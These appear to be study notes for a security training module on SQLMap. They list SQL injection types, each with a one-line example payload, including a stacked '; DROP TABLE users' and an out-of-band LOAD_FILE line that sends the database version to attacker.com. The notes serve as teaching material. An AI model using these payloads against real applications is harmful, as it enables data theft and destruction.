---
tags: [CWES, HTB, technical-reference]
module: "SQLMap Essentials"
source_file: "CWES.xmind"
---

# overview

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## Injection Types

### default "BEUSTQ"

- Boolean based
  - Boolean-based blind SQL Injection
    - most common SQLi type in web applications.
      - AND 1=1
- Error based
  - AND GTID_SUBSET(@@version,0)
- Union query Based
  - UNION ALL SELECT 1,@@version,3
    - This type of SQL injection is considered the fastest
- Time based
  - Time-based blind SQL Injection
    - AND 1=IF(2>1,SLEEP(5),0)
- Inline queries
  - SELECT (SELECT @@version) from
## statement is a non-query

### INSERT, UPDATE or DELETE

- time-based SQLi is used out of the necessity
## Stacked queries

### ; DROP TABLE users

## Out-of-band SQL Injection

### LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))

- considered one of the most advanced types of SQLi
